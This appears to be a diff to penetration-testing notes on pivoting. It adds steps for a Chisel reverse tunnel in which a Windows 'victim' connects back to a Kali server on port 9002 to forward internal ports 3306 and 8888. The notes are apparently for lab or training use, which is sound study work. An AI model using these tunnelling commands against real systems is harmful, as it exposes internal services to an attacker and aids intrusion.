@@ -500,7 +500,7 @@ Client Side (Victim):
 chisel client [my_ip]:12312 R:[port]:127.0.0.1:[port]
 ```
 
-### Chisel Kali -> Windows
+### <mark style="color:yellow;">Chisel Kali -> Windows</mark>
 
 {% embed url="https://github.com/jpillora/chisel/releases" %}
 GitHub Repository
@@ -514,6 +514,20 @@ gunzip -d *.gz
 ```
 
 * Now, transfer the Windows version of the file to Windows
+* On Kali, <mark style="color:yellow;">start the program in server mode since we want the Windows</mark>&#x20;
+
+```
+./chisel server --reverse --port 9002
+```
+
+* On the Windows machine, you will connect back to the Kali machine on port 9002.&#x20;
+* <mark style="color:yellow;">Once connected, we will forward all traffic sent to port localhost port 3306 to port 3306 on the Windows machine</mark>&#x20;
+* The 2nd entry does the same thing but for port 8888
+
+```
+.\chisel.exe client <kaliIP>:9002 R:3306:localhost:3306
+R:8888:localhost:8888
+```
 
 ## Checklist
 
